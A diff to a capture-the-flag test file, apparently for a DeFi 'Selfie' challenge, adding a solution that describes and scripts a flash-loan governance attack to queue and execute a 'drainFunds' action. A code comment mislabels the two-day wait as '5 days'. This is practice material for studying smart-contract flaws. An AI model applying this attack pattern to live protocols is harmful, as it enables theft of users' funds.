@@ -31,6 +31,25 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        /*
+        Use flash loan to acquire enough tokens to queue action
+        Wait 2 days
+        Use flash loan again to acquire enough tokens to execute action
+        Action = drainFunds(attacker)
+        */
+
+       const AttackFactory = await ethers.getContractFactory("SelfieAttack", attacker)
+       const attackContract = await AttackFactory.deploy(this.pool.address)
+
+       // queue
+       await attackContract.queue()
+
+       // wait 2 days
+       const secondsToWait = 2 * 24 * 60 * 60 // 5 days
+       await ethers.provider.send("evm_increaseTime", [secondsToWait]);
+
+       // execute
+        await attackContract.execute()
     });
 
     after(async function () {
